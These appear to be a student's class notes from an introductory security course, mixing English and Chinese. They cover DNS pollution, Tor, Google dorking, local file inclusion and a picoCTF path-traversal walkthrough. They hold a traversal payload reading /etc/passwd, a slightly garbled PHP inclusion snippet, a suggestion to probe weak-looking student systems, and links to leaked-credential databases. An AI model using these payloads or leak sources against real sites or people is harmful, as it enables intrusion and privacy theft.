# **Class**
- GFW
    - DNS 污染, change original ip address into another ip address
    - ex: visit www.zhapian.com, when going through DNS server, then DNS server change your ip address into www.pro.com
- 深網
    - line's server, gmail's server, etc
- 暗網
    - tor
        - 3 encryptions
        - 入口node, 中間node, 匯合node
- [Leakbase](https://leakbase.io/)
- [社工庫](https://txcdns.online/)
    - password, account, id, ic, etc...
- Google hacking
    - `site : <>`
    - `intext : <>`
    - `intitle : <>`
    - `inurl : <>`
    - `filetype : <>`
    - ex : intitle:"index of", webopac
- 打網站
    1. 學生系統, 看起來很爛的, 搜索系統
- [漏洞通報平台 Zeroday](https://zeroday.hitcon.org)
- [Hackme CTF](https://ctf.hackme.quest/scoreboard/)

# **Implementation**
1. Download [Tailscale](https://login.tailscale.com/admin/machines?q=shared%3Ain) and install 
# **PHP**
```
<?php
file_get_contents($_GET[‘module’]);
>

/?module=phpinfo.php

https://website.com/index.php?file=../../../../etc/passwd
```
- module => 清華大學學生帳號
- [ppt](https://drive.google.com/file/d/1xREGlyRtDuhiQYG4V7Q2a47TAem1Yyh1/view)
# **Forbidden Paths**
- [Forbidden Paths](https://play.picoctf.org/practice/challenge/270)
```
Can you get the flag?
We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?
```
1. We know that `flag.txt` is at `/`
2. Not absolute path so we can use `../` to go to `/` 
3. `../../../../flag.txt` => done
    - `../` => /usr/share/nginx/
    - `../../` => /usr/share/
    - `../../../` => /usr/
    - `../../../../` => /
